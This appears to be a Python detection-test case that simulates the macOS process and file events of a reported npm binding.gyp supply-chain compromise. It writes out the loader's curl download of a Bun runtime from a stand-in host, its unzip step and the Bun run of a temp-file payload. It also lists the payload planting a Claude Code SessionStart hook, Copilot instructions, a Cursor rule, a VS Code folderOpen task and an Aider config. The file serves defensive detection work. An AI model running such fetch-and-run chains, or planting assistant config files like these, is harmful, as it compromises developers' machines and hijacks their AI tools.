"""EAA-014 (with EAA-003 and EAA-004) as the compromised Immobiliare Labs
Backstage packages carried it (EAA-C-007, steps 1-3): `npm install` reaches
a dependency's binding.gyp, node-gyp's command substitution runs the
package's index.js, which fetches a Bun runtime, writes the decrypted main
payload to a temporary file and runs it with Bun; the payload's infectHost
routine writes a Claude Code SessionStart hook, Copilot instructions, a
Cursor rule, a VS Code folderOpen task and an Aider config."""
import es

CASE = {
    "id": "eaa-014-binding-gyp-payload-plants-assistant-files",
    "title": "A binding.gyp payload run by npm install, under Bun from the temp directory, writes five assistants' config into the project",
    "flag": True,
    "eaa": ["EAA-003", "EAA-004", "EAA-014"],
    "group": "control-plane",
    "grounding": {
        "catalog_case": "EAA-C-007",
        "steps": [1, 2, 3],
        "sources": ["SRC-009", "SRC-007", "https://www.stepsecurity.io/blog/immobiliarelabs-npm-packages-compromised",
                    "https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm"],
    },
    "notes": (
        "StepSecurity (Immobiliare): binding.gyp runs `node index.js` during npm install through node-gyp; an outer "
        "wrapper downloads Bun, writes the decrypted main payload to a randomly named temporary file, runs it with Bun "
        "and deletes it; infectHost targets .claude/settings.json (SessionStart), .github/copilot-instructions.md, "
        "a rule in .cursor/rules/, .vscode/tasks.json (folderOpen) and .aider.conf.yml, and Kiro, Cody, Gemini and "
        "Codex with no paths given (not written); the rule's name in the source's IOCs is replaced by a stand-in, "
        "workspace.mdc. The process chain and commands are those StepSecurity traced for the same "
        "binding.gyp loader (SRC-007, CI): npm, sh running node-gyp, node running node-gyp.js, `/bin/sh -c \"node "
        "index.js > /dev/null 2>&1 && echo stub.c\"`, node index.js; the loader's execSync of `curl -sSL \"<url>\" -o "
        "\"<dir>/b.zip\"` and `unzip -j -o \"<dir>/b.zip\" -d \"<dir>\"` (each a /bin/sh -c that execs it in place), "
        "<dir> from mkdtempSync(join(tmpdir(), \"b-\")), which is under $TMPDIR on macOS; then `<dir>/bun run "
        "<tmp>/p<random>.js`. In the events the trace's own names are stand-ins: echo empty.c, runtime.zip and the "
        "temporary directory's prefix gyprt-. Chosen where the sources are silent: the person ran npm install in their own terminal; "
        "the payload's file directly in $TMPDIR, as the trace's is in /tmp (the code that writes it is not shown); "
        "bun spawned by the loader in the package directory it runs in; the relative paths are written in the project "
        "npm install ran in (the source does not say workspace or home); the files are new. The payload's "
        "credential-theft routines are not written: their order is not known. The catalog has the routine present, not seen running on a victim. Package name made up."
    ),
}

WEB = "~/code/acme-web"
PKG = f"{WEB}/node_modules/globex-directory-auth-plugin"
NODE_GYP = "/opt/homebrew/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js"
TMP = "/var/folders/7x/k2m9q4z51b3c0000gn/T"  # os.tmpdir(): $TMPDIR without its slash; the kernel's path is under /private
DIR = f"{TMP}/gyprt-8f3k2q"  # mkdtempSync(join(tmpdir(), prefix)); the prefix is a stand-in
REAL = "/private" + DIR
PAYLOAD = f"{TMP}/p7c41e09a.js"
URL = "https://dl.example.com/bun/bun-darwin-aarch64.zip"
BUN = es.Program("bun", f"{REAL}/bun", "bun", "7FRXF46ZSN", es.DEVID_TOOL, dyld=f"{DIR}/bun", size=63072928)
UNZIP = es.Program("unzip", "/usr/bin/unzip", "com.apple.unzip")
PLANTED = [".claude/settings.json", ".github/copilot-instructions.md", ".cursor/rules/workspace.mdc",
           ".vscode/tasks.json", ".aider.conf.yml"]


def build(mac):
    sh = mac.terminal(cwd=WEB)
    mac.wait(5)
    npm = mac.spawn(sh, "npm", ["npm", "install"])
    for f in ("~/.npmrc", f"{WEB}/package.json", f"{WEB}/package-lock.json"):
        mac.read_file(npm, f)
    mac.wait(6)
    for f in ("package.json", "binding.gyp", "index.js", "README.md"):
        mac.write_file(npm, f"{PKG}/{f}", new=True)

    s = es.npm_lifecycle(mac, npm, PKG, "node-gyp rebuild", event="install", version="0.4.3")
    gyp = mac.spawn(s, "node", ["node", NODE_GYP, "rebuild"], fds="pipe")
    mac.read_file(gyp, f"{PKG}/binding.gyp")
    mac.wait(0.8)
    sub = mac.spawn(gyp, "sh", ["/bin/sh", "-c", "node index.js > /dev/null 2>&1 && echo empty.c"], fds="pipe")
    loader = mac.spawn(sub, "node", ["node", "index.js"], fds="null")  # && echo: echo is sh's own
    mac.read_file(loader, f"{PKG}/index.js")
    line = f'curl -sSL "{URL}" -o "{DIR}/runtime.zip"'
    c = mac.spawn(loader, "sh", ["/bin/sh", "-c", line], fds="pipe")
    mac.exec(c, "curl", ["curl", "-sSL", URL, "-o", f"{DIR}/runtime.zip"])
    mac.create(c, f"{REAL}/runtime.zip")
    mac.open(c, f"{REAL}/runtime.zip", es.FWRITE | es.O_CREAT | es.O_TRUNC)
    mac.wait(2.5)
    mac.close(c, f"{REAL}/runtime.zip", modified=True)
    mac.exit(c)
    line = f'unzip -j -o "{DIR}/runtime.zip" -d "{DIR}"'
    u = mac.spawn(loader, "sh", ["/bin/sh", "-c", line], fds="pipe")
    mac.exec(u, UNZIP, ["unzip", "-j", "-o", f"{DIR}/runtime.zip", "-d", DIR])
    mac.read_file(u, f"{REAL}/runtime.zip")
    mac.write_file(u, f"{REAL}/bun", new=True)
    mac.exit(u)
    mac.write_file(loader, "/private" + PAYLOAD, new=True)
    bun = mac.spawn(loader, BUN, [f"{DIR}/bun", "run", PAYLOAD], fds="pipe", key=True)
    mac.read_file(bun, "/private" + PAYLOAD)
    mac.wait(1.5)
    for f in PLANTED:
        mac.write_file(bun, f"{WEB}/{f}", key=True)
        mac.wait(0.01)
    mac.wait(0.5)
    mac.exit(bun)
    mac.unlink(loader, "/private" + PAYLOAD)
    mac.exit(loader)
    mac.exit(sub)
    mac.write_file(gyp, f"{PKG}/build/config.gypi", new=True)
    mac.exit(gyp)
    mac.exit(s)

    mac.write_file(npm, f"{WEB}/node_modules/.package-lock.json", new=True)
    mac.write_file(npm, f"{WEB}/package-lock.json")
    mac.exit(npm)
    mac.wait(30)
    mac.logout(sh)
